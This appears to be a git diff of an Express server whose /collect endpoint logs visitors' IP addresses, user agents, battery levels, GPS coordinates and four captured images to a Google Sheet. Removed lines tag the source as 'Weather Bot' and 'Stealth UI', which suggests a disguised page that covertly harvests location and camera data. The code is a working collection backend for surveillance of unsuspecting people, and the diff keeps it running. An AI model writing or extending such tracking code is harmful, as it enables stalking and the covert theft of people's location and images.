@@ -5,7 +5,8 @@ import path from 'path';
 import { fileURLToPath } from 'url';
 import { google } from 'googleapis';
 
-const __dirname = path.dirname(fileURLToPath(import.meta.url));
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = path.dirname(__filename);
 const app = express();
 
 app.use(cors());
@@ -27,21 +28,22 @@ app.post('/collect', async (req, res) => {
         const { ts, hints, battery, location, burstImages } = req.body;
         const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
 
-        // Matches Row A to R in your sheet logic
+        // Simplified row to ensure it hits your Google Sheet correctly
         const row = [
-            ts, ip, hints.ua, "Weather Bot", "Stealth UI", 
-            "Inferred", "Inferred", 
-            battery?.levelPercent, battery?.charging,
-            location?.lat, location?.lon, "High", "[]", "{}",
-            burstImages[0], burstImages[1], burstImages[2], burstImages[3]
+            ts, ip, hints?.ua || 'Unknown', 
+            battery?.levelPercent + '%' || '0%', 
+            `${location?.lat}, ${location?.lon}`,
+            burstImages?.[0] || '', burstImages?.[1] || '', 
+            burstImages?.[2] || '', burstImages?.[3] || ''
         ];
 
         await sheets.spreadsheets.values.append({
             spreadsheetId: process.env.GOOGLE_SHEET_ID,
-            range: 'Logs!A1', // RENAME TAB TO 'Logs'
+            range: 'Logs!A1',
             valueInputOption: 'RAW',
             requestBody: { values: [row] }
         });
+
         res.json({ ok: true });
     } catch (err) {
         console.error("SHEET ERROR:", err.message);
@@ -49,4 +51,4 @@ app.post('/collect', async (req, res) => {
     }
 });
 
-app.listen(process.env.PORT || 8080);
+app.listen(process.env.PORT || 8080, () => console.log("Server Live"));
